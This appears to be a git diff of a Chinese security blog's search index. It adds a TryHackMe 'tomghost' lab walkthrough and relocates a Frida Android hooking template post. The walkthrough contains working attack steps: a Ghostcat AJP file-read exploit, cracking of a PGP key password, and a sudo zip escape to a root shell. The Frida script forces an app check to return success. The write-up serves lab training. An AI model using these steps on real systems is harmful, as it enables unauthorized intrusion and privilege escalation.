@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>tomghost</title>
+      <link href="/2024/11/16/tomghost/"/>
+      <url>/2024/11/16/tomghost/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.211.222</td></tr><tr><td>OS</td><td>Kali</td><td>Linux ubuntu</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT     STATE SERVICE    REASON</span><br><span class="line">22/tcp   open  ssh        syn-ack ttl 60</span><br><span class="line">53/tcp   open  domain     syn-ack ttl 60</span><br><span class="line">8009/tcp open  ajp13      syn-ack ttl 60</span><br><span class="line">8080/tcp open  http-proxy syn-ack ttl 60</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.71 seconds</span><br><span class="line">           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进一步进行版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT     STATE SERVICE    REASON         VERSION</span><br><span class="line">22/tcp   open  ssh        syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp   open  tcpwrapped syn-ack ttl 60</span><br><span class="line">8009/tcp open  ajp13      syn-ack ttl 60 Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp open  http       syn-ack ttl 60 Apache Tomcat 9.0.30</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache jserv protocol v1.3 exploit</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241116163206.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116163206.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/leonooo13/CNVD-2020-10487-Tomcat-Ajp-lfi.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py -h           </span><br><span class="line">usage: CNVD-2020-10487-Tomcat-Ajp-lfi.py [-h] [-p PORT] [-f FILE] target</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                Hostname or IP to attack</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PORT, --port PORT  AJP port to attack (default is 8009)</span><br><span class="line">  -f FILE, --file FILE  file path :(WEB-INF/web.xml)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi.py 10.10.211.222                       </span><br><span class="line">-----------------------------------</span><br><span class="line">目标: 10.10.211.222 端口: 8009 文件:WEB-INF/web.xml</span><br><span class="line">-----------------------------------</span><br><span class="line">Getting resource at ajp13://10.10.211.222:8009/asdf</span><br><span class="line">----------------------------</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work <span class="keyword">for</span> additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the <span class="string">&quot;License&quot;</span>); you may not use this file except <span class="keyword">in</span> compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to <span class="keyword">in</span> writing, software</span><br><span class="line">  distributed under the License is distributed on an <span class="string">&quot;AS IS&quot;</span> BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License <span class="keyword">for</span> the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">  xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><br><span class="line"><span class="string">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">  version=<span class="string">&quot;4.0&quot;</span></span><br><span class="line">  metadata-complete=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span><br><span class="line">  &lt;description&gt;</span><br><span class="line">     Welcome to GhostCat</span><br><span class="line">        skyfuck:8730281lkjlkjdqlksalks</span><br><span class="line">  &lt;/description&gt;</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><p>ssh登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skyfuck:8730281lkjlkjdqlksalks </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">skyfuck@ubuntu:~$ ls -la</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 3 skyfuck skyfuck 4096 Nov 16 00:44 .</span><br><span class="line">drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..</span><br><span class="line">-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history</span><br><span class="line">-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc</span><br><span class="line">drwx------ 2 skyfuck skyfuck 4096 Nov 16 00:44 .cache</span><br><span class="line">-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp</span><br><span class="line">-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile</span><br><span class="line">-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ gpg2john tryhackme.asc &gt; hash.txt</span><br><span class="line"></span><br><span class="line">File tryhackme.asc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])</span><br><span class="line">Cost 1 (s2k-count) is 65536 for all loaded hashes</span><br><span class="line">Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes</span><br><span class="line">Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">alexandru        (tryhackme)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-11-16 03:55) 25.00g/s 26800p/s 26800c/s 26800C/s theresa..alexandru</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导入pgp秘钥文件，期间输入上面的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ gpg --import tryhackme.asc</span><br><span class="line">gpg: 钥匙箱‘/home/kali/.gnupg/pubring.kbx’已创建</span><br><span class="line">gpg: /home/kali/.gnupg/trustdb.gpg：建立了信任度数据库</span><br><span class="line">gpg: 密钥 8F3DA3DEC6707170：公钥 “tryhackme &lt;stuxnet@tryhackme.com&gt;” 已导入</span><br><span class="line">gpg: 密钥 8F3DA3DEC6707170：私钥已导入</span><br><span class="line">gpg: 密钥 8F3DA3DEC6707170：“tryhackme &lt;stuxnet@tryhackme.com&gt;” 未改变</span><br><span class="line">gpg: 处理的总数：2</span><br><span class="line">gpg:               已导入：1</span><br><span class="line">gpg:              未改变：1</span><br><span class="line">gpg:       读取的私钥：1</span><br><span class="line">gpg:   导入的私钥：1</span><br></pre></td></tr></table></figure><p>gpg解密<code>credential.pgp</code>文件，期间再次输入上面的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ gpg credential.pgp        </span><br><span class="line">gpg: 警告：没有提供命令。正在尝试猜测您的意图...</span><br><span class="line">gpg: 注意：接收者的偏好设置中找不到密文算法 CAST5</span><br><span class="line">gpg: 由 1024 位的 ELG 密钥加密，标识为 61E104A66184FBCC，生成于 2020-03-11</span><br><span class="line">      “tryhackme &lt;stuxnet@tryhackme.com&gt;”</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat credential      </span><br><span class="line">merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j                                                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~/Documents/thm/tomghost]</span><br><span class="line">└─$ ssh merlin@10.10.211.222            </span><br><span class="line">merlin@10.10.211.222&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">merlin@ubuntu:~$ id</span><br><span class="line">uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)</span><br><span class="line">merlin@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries for merlin on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User merlin may run the following commands on ubuntu:</span><br><span class="line">    (root : root) NOPASSWD: /usr/bin/zip</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>gobins 提权</p><p><a href="/../assets/img/Pasted%20image%2020241116170030.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116170030.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">merlin@ubuntu:~$ TF=$(mktemp -u)</span><br><span class="line">merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT &#x27;sh #&#x27;</span><br><span class="line">  adding: etc/hosts (deflated 31%)</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p> 痕迹清理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm $TF </span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+            <tag> THM </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>creative-thm</title>
       <link href="/2024/11/16/creative/"/>
       <url>/2024/11/16/creative/</url>
@@ -312,6 +333,33 @@
     
     
     <entry>
+      <title>Frida的一些模板和配置及一些场景目录和问题记录</title>
+      <link href="/2024/11/13/2024-11-08-Frida-Template/"/>
+      <url>/2024/11/13/2024-11-08-Frida-Template/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>本文主要记录了Frida的一些模板和配置及一些场景目录和问题记录<br>前提是已经安装了Frida，查看其他文章</p></blockquote><h1 id="启动和配置"><a href="#启动和配置" class="headerlink" title="启动和配置"></a>启动和配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /data/local/tmp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 修改 文件 权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 frida-server</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行文件</span></span><br><span class="line">./frida-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line"></span><br><span class="line"> frida-ps -U</span><br></pre></td></tr></table></figure><h1 id="Frida的一些模板和配置"><a href="#Frida的一些模板和配置" class="headerlink" title="Frida的一些模板和配置"></a>Frida的一些模板和配置</h1><h2 id="python模板"><a href="#python模板" class="headerlink" title="python模板"></a>python模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义消息回调函数，接收 Frida 脚本发送的消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用包名来附加目标应用并执行 JS 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_target_application</span>(<span class="params">app_name, js_file</span>):</span><br><span class="line">    <span class="comment"># JavaScript 脚本内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(js_file, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        script_source = fin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 USB 设备并通过包名附加到目标应用</span></span><br><span class="line">    <span class="comment"># 也可以使用进程id</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pid = device.spawn(package_name)</span></span><br><span class="line">    <span class="comment"># print(pid)</span></span><br><span class="line">    process = device.attach(app_name)</span><br><span class="line">    <span class="comment"># 创建并加载脚本</span></span><br><span class="line">    script = process.create_script(script_source)</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待用户输入停止信号</span></span><br><span class="line">    sys.stdin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卸载脚本并分离进程</span></span><br><span class="line">    script.unload()</span><br><span class="line">    process.detach()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置目标应用的包名</span></span><br><span class="line">    app_name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line"> </span><br><span class="line">    js_file = <span class="string">&quot;scripts/js_file.js&quot;</span></span><br><span class="line">    <span class="comment"># 调用函数进行 hook</span></span><br><span class="line">    hook_target_application(app_name, js_file)</span><br></pre></td></tr></table></figure><h2 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 JNI 类</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.myapplication.MainActivity&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 getResult 方法</span></span><br><span class="line">    <span class="title class_">Activity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult called with:&#x27;</span>, str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">check</span>(str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult returned:&#x27;</span>, result);</span><br><span class="line">        <span class="comment">// 返回原始结果</span></span><br><span class="line">        result = <span class="string">&quot;right&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><p><code>process = device.attach(app_name)</code> 如果使用包名的话，会报错，需要使用进程id或者应用名称</p><h2 id="Github也有这个issue"><a href="#Github也有这个issue" class="headerlink" title="Github也有这个issue?"></a>Github也有这个issue?</h2><p><a href="/../assets/img/image-120.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-120.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> APP逆向 </tag>
+            
+            <tag> 移动安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>网络安全打靶总结</title>
       <link href="/2024/11/13/2024-10-17-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E6%80%BB%E7%BB%93/"/>
       <url>/2024/11/13/2024-10-17-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E6%80%BB%E7%BB%93/</url>
@@ -333,33 +381,6 @@
             <tag> HTB </tag>
             
             <tag> OFFSEC </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Frida的一些模板和配置及一些场景目录和问题记录</title>
-      <link href="/2024/11/13/2024-11-08-Frida-Template/"/>
-      <url>/2024/11/13/2024-11-08-Frida-Template/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>本文主要记录了Frida的一些模板和配置及一些场景目录和问题记录<br>前提是已经安装了Frida，查看其他文章</p></blockquote><h1 id="启动和配置"><a href="#启动和配置" class="headerlink" title="启动和配置"></a>启动和配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /data/local/tmp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 修改 文件 权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 frida-server</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行文件</span></span><br><span class="line">./frida-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line"></span><br><span class="line"> frida-ps -U</span><br></pre></td></tr></table></figure><h1 id="Frida的一些模板和配置"><a href="#Frida的一些模板和配置" class="headerlink" title="Frida的一些模板和配置"></a>Frida的一些模板和配置</h1><h2 id="python模板"><a href="#python模板" class="headerlink" title="python模板"></a>python模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义消息回调函数，接收 Frida 脚本发送的消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span 